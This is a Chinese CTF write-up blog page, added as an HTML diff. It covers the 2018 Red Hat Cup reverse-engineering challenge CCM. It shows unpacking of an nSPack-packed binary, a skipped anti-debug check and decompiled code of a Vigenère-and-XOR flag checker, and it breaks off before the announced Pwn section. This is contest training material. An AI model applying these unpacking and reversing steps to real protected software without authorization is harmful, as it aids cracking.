@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Some pieces of beef, and some vegetables too.">
+    <meta name="keyword"  content="undefined">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          2018 红帽杯线上赛一道 RE + 一道 Pwn 解题报告（writeup） - Goulash
+        
+    </title>
+
+    <link rel="canonical" href="https://hx1997.github.io/2018/05/06/2018-redhat-online-re-ccm-writeup/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.2/dist/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    
+<!-- Google Analytics -->
+<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-59747917-2', 'auto');
+	ga('send', 'pageview');
+</script>
+<!-- End Google Analytics --><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Goulash</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">ABOUT</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">ARCHIVES</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/animal-farm/">Animal Farm</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/links/">Links</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">TAGS</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://hx1997.github.io/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('///s3.bmp.ovh/imgs/2021/12/786122cd6225bd96.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#信息安全" title="信息安全">信息安全</a>
+                        
+                          <a class="tag" href="/tags/#CTF" title="CTF">CTF</a>
+                        
+                          <a class="tag" href="/tags/#Writeups" title="Writeups">Writeups</a>
+                        
+                    </div>
+                    <h1>2018 红帽杯线上赛一道 RE + 一道 Pwn 解题报告（writeup）</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by HX on
+                        2018-05-06 | 
+                        <span id="/2018/05/06/2018-redhat-online-re-ccm-writeup/" class="leancloud-visitors" data-flag-title="文章阅读量统计">
+                            <span class="pre-meta-item-text">👓 </span>
+                            <span class="leancloud-visitors-count"></span>
+                            <span class="post-meta-item-text"> views</span>
+                        </span>
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h3 id="x0.-前言">0x0. 前言</h3>
+<p>这次红帽杯除送分题外唯一做出的题就是一道逆向（还有一道 Pwn 差了一点，比赛结束后才做出来），我好菜啊。不过组队打 CTF 还是开心，嘻嘻。</p>
+<p>比赛文件下载：<a href="https://github.com/hx1997/CTF-writeups/blob/master/2018-redhat-online-re-ccm-writeup/CCM.exe?raw=true" target="_blank" rel="external">RE - CCM</a>、<a href="https://github.com/hx1997/CTF-writeups/blob/master/2018-redhat-online-re-ccm-writeup/pwn2?raw=true" target="_blank" rel="external">Pwn2</a></p>
+<h3 id="x1.-re---ccm">0x1. RE - CCM</h3>
+<p>拿到 exe，扔进 PEiD 看看。</p>
+<div class="figure">
+<img src="//i.loli.net/2019/05/03/5ccc2512ee435.jpg">
+
+</div>
+<p>加了 nSPack 壳，先找个工具脱壳。脱壳后的文件拖进 IDA，按 F5 看伪代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> <span class="number">__</span><span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  FILE *v3; <span class="comment">// eax@1</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@5</span></div><div class="line">  <span class="keyword">char</span> v5; <span class="comment">// [sp+1h] [bp-55h]@2</span></div><div class="line">  <span class="keyword">char</span> Buf; <span class="comment">// [sp+2h] [bp-54h]@1</span></div><div class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [sp+3h] [bp-53h]@1</span></div><div class="line">  <span class="keyword">char</span> v8; <span class="comment">// [sp+2Ch] [bp-2Ah]@1</span></div><div class="line">  <span class="keyword">char</span> v9; <span class="comment">// [sp+2Dh] [bp-29h]@2</span></div><div class="line"></div><div class="line">  Buf = <span class="number">0</span>;</div><div class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">79u</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Input Flag"</span>);</div><div class="line">  v3 = <span class="number">_</span>iob_func();</div><div class="line">  fgets(&amp;Buf, <span class="number">44</span>, v3);</div><div class="line">  <span class="keyword">if</span> ( v8 != <span class="number">10</span> || (v9 = <span class="number">0</span>, *(&amp;v5 + <span class="built_in">strlen</span>(&amp;Buf)) = <span class="number">0</span>, <span class="built_in">strlen</span>(&amp;Buf) != <span class="number">42</span>) )</div><div class="line">  &#123;</div><div class="line">    result = <span class="number">-1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( sub_401380((<span class="keyword">int</span>)&amp;Buf, <span class="number">42</span>) == <span class="number">1</span> )</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"Right!\n"</span>);</div><div class="line">    result = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><code>main</code> 函数逻辑很简单，就是确认输入的 flag 长度为 42，再经过函数 <code>sub_401380</code> 处理，如果返回 1 就打印 <code>Right!</code>，表示输入的 flag 正确。</p>
+<p>进入 <code>sub_401380</code> 分析。</p>
+<div class="figure">
+<img src="//i.loli.net/2019/05/03/5ccc25133ec94.jpg">
+
+</div>
+<p>看不全的两行后面再说。</p>
+<p>这里一上来是一个反调试，总共三句 <code>GetTickCount()</code>，因为只会影响到动态调试，不会影响静态分析，所以不用管。</p>
+<p>比较重要的是几个函数调用，以及标签 <code>LABEL_15</code> 后的代码。先看第 33 行调用的 <code>sub_401320</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( sub_401320(v3, v2) != <span class="number">1</span> )</div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="number">__f</span><span class="function">astcall <span class="title">sub_401320</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v2; <span class="comment">// esi@1</span></div><div class="line"></div><div class="line">  v2 = <span class="number">0</span>;</div><div class="line">  <span class="keyword">while</span> ( byte_4021B4[v2] == ((<span class="keyword">unsigned</span> <span class="number">__</span>int8)*(&amp;byte_4021B4[a1 - (<span class="keyword">signed</span> <span class="keyword">int</span>)byte_4021B4] + v2) ^ <span class="number">0x99</span>) )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( ++v2 &gt;= <span class="number">5</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( *(<span class="number">_B</span>YTE *)(a1 + a2 - <span class="number">1</span>) == <span class="string">'&#125;'</span></div><div class="line">        &amp;&amp; *(<span class="number">_B</span>YTE *)(a1 + <span class="number">13</span>) == <span class="string">'-'</span></div><div class="line">        &amp;&amp; *(<span class="number">_B</span>YTE *)(a1 + <span class="number">18</span>) == <span class="string">'-'</span></div><div class="line">        &amp;&amp; *(<span class="number">_B</span>YTE *)(a1 + <span class="number">23</span>) == <span class="string">'-'</span></div><div class="line">        &amp;&amp; *(<span class="number">_B</span>YTE *)(a1 + <span class="number">28</span>) == <span class="string">'-'</span> )</div><div class="line">      &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这个函数作用是以 <code>0x99</code> 为异或密钥检验输入 flag 的前五位是否为 <code>flag{</code>，并直接比对第 14、19、24、29 位是否为 <code>-</code>，以及最后一位是否为 <code>}</code>。换句话说，输入的 flag 格式必须是 <code>flag{????????-????-????-????-????????????}</code>，其中 <code>?</code> 是待确定字符。</p>
+<p>回到上一个函数，按程序流程走到第 35 行，进入 <code>sub_401280</code> 分析。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_401280</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v0; <span class="comment">// esi@1</span></div><div class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">signed</span> <span class="number">__</span>int64 v3; <span class="comment">// rtt@2</span></div><div class="line"></div><div class="line">  srand(<span class="number">0x556AAF49</span>u);</div><div class="line">  v0 = <span class="number">0</span>;</div><div class="line">  <span class="keyword">do</span></div><div class="line">  &#123;</div><div class="line">    v1 = rand();</div><div class="line">    v3 = v1;</div><div class="line">    result = v1 / <span class="number">26</span>;</div><div class="line">    byte_403370[v0++] = (<span class="keyword">unsigned</span> <span class="number">__</span>int64)(v3 % <span class="number">26</span>) + <span class="string">'a'</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">while</span> ( v0 &lt; <span class="number">84</span> );</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这个函数作用是用随机数种子 <code>0x556AAF49</code> 生成 84 个伪随机数，每个数模 26 映射到 a-z 26 个小写字母，再存到全局数组 <code>byte_403370</code> 中，作为后面加密替换的密码表之一。因为随机数种子固定，所以生成的伪随机数和密码表也是固定的，密码表为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sxcunsbjptdunaaxklcvxsikxiewcmpwdngfqtfvomgkbwjrmccntqlratukzoafmngbyykjtabnhrnmweln</div></pre></td></tr></table></figure>
+<p>回到上一个函数继续走，动态分配了两个数组，并在第 41 行将其中一个数组 <code>flag_hex_ary</code> 作为参数传入 <code>sub_4012C0</code>，跟进去分析。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">flag_hex_ary = <span class="built_in">malloc</span>(<span class="number">0x100</span>u);</div><div class="line">new_pass_table = <span class="built_in">malloc</span>(<span class="number">0x100</span>u);</div><div class="line"><span class="built_in">memset</span>(flag_hex_ary, <span class="number">0</span>, <span class="number">0x100</span>u);</div><div class="line"><span class="built_in">memset</span>(new_pass_table, <span class="number">0</span>, <span class="number">0x100</span>u);</div><div class="line">v7 = v17;</div><div class="line">sub_4012C0((<span class="keyword">int</span>)flag_hex_ary, v16, v17);</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> <span class="number">__u</span><span class="function">sercall <span class="title">sub_4012C0</span><span class="params">(<span class="keyword">int</span> a1@&lt;edx&gt;, <span class="keyword">int</span> a2@&lt;ecx&gt;, <span class="keyword">int</span> a3)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi@1</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// ebx@1</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx@2</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">char</span> v7; <span class="comment">// cl@3</span></div><div class="line">  <span class="keyword">char</span> v8; <span class="comment">// al@6</span></div><div class="line"></div><div class="line">  v3 = <span class="number">0</span>;</div><div class="line">  <span class="keyword">for</span> ( i = a2; v3 &lt; a3; ++v3 )</div><div class="line">  &#123;</div><div class="line">    v5 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*(<span class="number">_B</span>YTE *)(v3 + i) &gt;&gt; <span class="number">4</span>;</div><div class="line">    v6 = *(<span class="number">_B</span>YTE *)(v3 + i) % <span class="number">16</span>;</div><div class="line">    <span class="keyword">if</span> ( v5 &gt; <span class="number">9</span> )</div><div class="line">      v7 = v5 + <span class="string">'W'</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">      v7 = v5 + <span class="string">'0'</span>;</div><div class="line">    <span class="keyword">if</span> ( v6 &gt; <span class="number">9</span> )</div><div class="line">      v8 = v6 + <span class="string">'W'</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">      v8 = v6 + <span class="string">'0'</span>;</div><div class="line">    *(<span class="number">_B</span>YTE *)(a1 + <span class="number">2</span> * v3) = v7;</div><div class="line">    *(<span class="number">_B</span>YTE *)(a1 + <span class="number">2</span> * v3 + <span class="number">1</span>) = v8;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>简单来说，这个函数作用是把输入的 flag 转换成十六进制字符串，例如字符串 abc 会转换成字符串 616263（61、62、63 是 a、b、c 三个字符的十六进制 ASCII 码）。转换后的字符串（严格来说没有结束符）存到传进来的数组中。注意，转换后的字符串长度是原来的两倍，即 42*2=84 字节；而且转换后字符串中字母全小写。</p>
+<p>回到上一个函数继续走，第 48 行以两个局部数组为参数调用了 <code>sub_401000</code>，进入分析。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sub_401000(&amp;subst_table_up, &amp;subst_table_low);</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">  v4 = <span class="number">0</span>;</div><div class="line">  <span class="keyword">do</span></div><div class="line">  &#123;</div><div class="line">    v5 = <span class="number">0</span>;</div><div class="line">    <span class="keyword">do</span></div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( v4 )</div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span> ( v5 )</div><div class="line">        &#123;</div><div class="line">          v6 = (v5 + v4 - <span class="number">2</span>) % <span class="number">26</span> + <span class="string">'a'</span>;</div><div class="line">          v7 = v5 + <span class="number">27</span> * v4;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">          v6 = v4 + <span class="string">'`'</span>;</div><div class="line">          v7 = <span class="number">27</span> * v4;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">else</span></div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span> ( !v5 )</div><div class="line">        &#123;</div><div class="line">          *v9 = <span class="number">32</span>;</div><div class="line">          <span class="keyword">goto</span> LABEL_22;</div><div class="line">        &#125;</div><div class="line">        v6 = v5 + <span class="string">'`'</span>;</div><div class="line">        v7 = v5;</div><div class="line">      &#125;</div><div class="line">      v9[v7] = v6;</div><div class="line">LABEL_22:</div><div class="line">      ++v5;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span> ( v5 &lt; <span class="number">27</span> );</div><div class="line">    ++v4;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
+<p>这个函数有两部分，功能一样，只是一个针对小写字母，一个针对大写字母，这里只截取了小写字母部分，后面的分析将会表明大写字母的部分是没用的。</p>
+<p>这个函数的作用是生成两张维吉尼亚密码表，一张小写，一张大写，长这样（要用到的是小写的）：</p>
+<div class="figure">
+<img src="//i.loli.net/2019/05/03/5ccc2513388f6.jpg">
+
+</div>
+<p>小写密码表会存到传入的局部数组 <code>subst_table_low</code>，以备后面加密替换。</p>
+<p>回到上一个函数继续走，第 49 行调用了 <code>sub_401170</code>，参数是转换过的十六进制字符串、两张维吉尼亚密码表、一个空数组，进入分析。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sub_401170((<span class="keyword">int</span>)new_pass_table, (<span class="keyword">const</span> <span class="keyword">char</span> *)flag_hex_ary, v8, (<span class="keyword">int</span>)&amp;subst_table_up, (<span class="keyword">int</span>)&amp;subst_table_low);</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">v18 = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> ( flag_hex_ary_len &gt; <span class="number">0</span> )</div><div class="line">      &#123;</div><div class="line">        v17 = flag_hex_ary_len;</div><div class="line">        v10 = new_pass_table - (<span class="number">_</span>DWORD)hex_ary_idx;</div><div class="line">        <span class="keyword">do</span></div><div class="line">        &#123;</div><div class="line">          cur_ary_char = *hex_ary_idx;</div><div class="line">          <span class="keyword">if</span> ( (*hex_ary_idx &lt; <span class="string">'A'</span> || cur_ary_char &gt; <span class="string">'Z'</span>) &amp;&amp; (cur_ary_char &lt; <span class="string">'a'</span> || cur_ary_char &gt; <span class="string">'z'</span>) )</div><div class="line">          &#123;</div><div class="line">            v7 = v18;</div><div class="line">            v9 = <span class="number">84</span>;                           <span class="comment">// set v9 to 84</span></div><div class="line">            v12 = *(&amp;byte_402144[<span class="number">4</span> * (<span class="keyword">unsigned</span> <span class="number">__</span>int8)(((<span class="keyword">unsigned</span> <span class="number">__</span>int8)cur_ary_char - <span class="string">'0'</span>) / <span class="number">4</span>)]</div><div class="line">                  + (<span class="keyword">unsigned</span> <span class="number">__</span>int8)(((<span class="keyword">unsigned</span> <span class="number">__</span>int8)cur_ary_char - <span class="string">'0'</span>) % <span class="number">4</span>));<span class="comment">// hex_ary中数字转换成GHIJKLMNO</span></div><div class="line">          &#125;</div><div class="line">          <span class="keyword">else</span></div><div class="line">          &#123;</div><div class="line">            v12 = sub_4010E0(byte_403370[v7 % v9], cur_ary_char, subst_table_up, subst_table_low);<span class="comment">// hex_ary中字母换成密码表中对应项：cur_ary_char所在列，byte_403370[v7 % v9]所在行交叉处的字符</span></div><div class="line">            v7 = v18++ + <span class="number">1</span>;                     <span class="comment">// 只在遇到字母时加一</span></div><div class="line">          &#125;</div><div class="line">          (hex_ary_idx++)[v10] = v12;           <span class="comment">// 加密后的字符存到new_pass_table</span></div><div class="line">          --v17;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">while</span> ( v17 );                          <span class="comment">// 遍历hex_ary</span></div></pre></td></tr></table></figure>
+<p>只截取了重要部分代码。这个函数对传进来的十六进制字符串加密，根据每个字符是数字还是字母分别处理：数字 0123456789 分别转换成 GHIJKLMNOP，字母则调用函数 <code>sub_4010E0</code> 决定要替换成什么字符。加密后的字符串存到 <code>new_pass_table</code>。限于篇幅，这里就不展开了，字母替换的规则简单来说就是在小写维吉尼亚密码表（由于前面生成十六进制字符串的算法中只会生成小写字母，所以大写维吉尼亚密码表其实没用到）第一行找到待替换字符所在列，再在第一列找到 <code>byte_403370[v7 % v9]</code> 这个字符所在行，行列交叉处的字符就是要替换成的字符。</p>
+<p>回到上一个函数，按流程走到第 72 行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">  v18 = <span class="number">2</span> * <span class="number">42</span>;</div><div class="line">  v11 = <span class="number">2</span> * <span class="number">42</span>;</div><div class="line">  v12 = <span class="number">204</span>;</div><div class="line">  v13 = <span class="number">7</span>;</div><div class="line">  <span class="keyword">while</span> ( v12 - <span class="number">204</span> == v13 )</div><div class="line">  &#123;</div><div class="line">    v13 += <span class="number">16</span>;</div><div class="line">LABEL_15:</div><div class="line">    <span class="keyword">if</span> ( ++v12 - <span class="number">204</span> &gt;= v11 )</div><div class="line">    &#123;</div><div class="line">      v10 = <span class="built_in">free</span>;</div><div class="line">      <span class="keyword">goto</span> LABEL_17;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ( *((<span class="number">_B</span>YTE *)&amp;dword_402160[<span class="number">-51</span>] + v12) == (v12 % <span class="number">256</span> ^ *((<span class="keyword">char</span> *)new_pass_table + v12 - <span class="number">204</span>)) )</div><div class="line">  &#123;</div><div class="line">    v11 = v18;</div><div class="line">    <span class="keyword">goto</span> LABEL_15;</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">free</span>(new_pass_table);</div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</div></pre></td></tr></table></figure>
+<p>一开始 <code>while</code> 循环不会执行，先看到很长的那句，作用是比对全局数组 <code>dword_402160</code> 中的每个字节和 <code>v12 % 256</code> 与 <code>new_pass_table</code> 中每个字节的异或是否相等，不相等就返回 -1，全部相等就跳到标签 <code>LABEL_17</code>。我们的目的是使程序最后打印出 <code>Right!</code>，从而确定正确的 flag，所以要求 <code>if</code> 语句必须满足，即二者必须相等。</p>
+<p>注意到异或运算的一个性质：如果 A ^ B = C，那么 A ^ C = B。现在已知 <code>dword_402160</code> 数组的内容和 <code>v12 % 256</code> 的值，可以反推出输入正确的 flag 时，<code>new_pass_table</code> 中应该有的内容。再结合前面分析的加密算法，可以从 <code>new_pass_table</code> 再解密还原出正确的 flag。</p>
+<p>写了一段 C 代码，得到正确 flag 对应的 <code>new_pass_table</code> 内容是（都是十六进制数）：</p>
+<blockquote>
